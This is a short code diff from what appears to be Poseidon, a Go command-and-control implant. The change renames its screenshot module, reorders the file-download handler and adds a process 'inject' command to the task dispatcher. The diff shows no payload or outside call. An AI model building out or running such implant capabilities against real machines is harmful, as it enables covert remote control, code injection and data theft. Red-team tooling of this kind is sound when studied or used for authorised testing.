@@ -15,8 +15,9 @@ import (
 	"github.com/xorrior/poseidon/pkg/commands/keys"
 	"github.com/xorrior/poseidon/pkg/commands/ls"
 	"github.com/xorrior/poseidon/pkg/commands/ps"
-	"github.com/xorrior/poseidon/pkg/commands/screenshot"
+	"github.com/xorrior/poseidon/pkg/commands/screencapture"
 	"github.com/xorrior/poseidon/pkg/commands/shell"
+	"github.com/xorrior/poseidon/pkg/commands/inject"
 	"github.com/xorrior/poseidon/pkg/commands/sshauth"
 	"github.com/xorrior/poseidon/pkg/commands/triagedirectory"
 	"github.com/xorrior/poseidon/pkg/profiles"
@@ -116,7 +117,11 @@ func main() {
 				break
 			case 2:
 				// Capture screenshot
-				go screenshot.Run(task, res)
+				go screencapture.Run(task, res)
+				break
+			case 4:
+				//File download
+				profile.Download(task, task.Params)
 				break
 			case 5:
 				// File upload
@@ -145,11 +150,9 @@ func main() {
 
 				break
 
-			case 4:
-				//File download
-				profile.Download(task, task.Params)
+			case 6:
+				go inject.Run(task, res)
 				break
-
 			case 7:
 				go ps.Run(task, res)
 				break
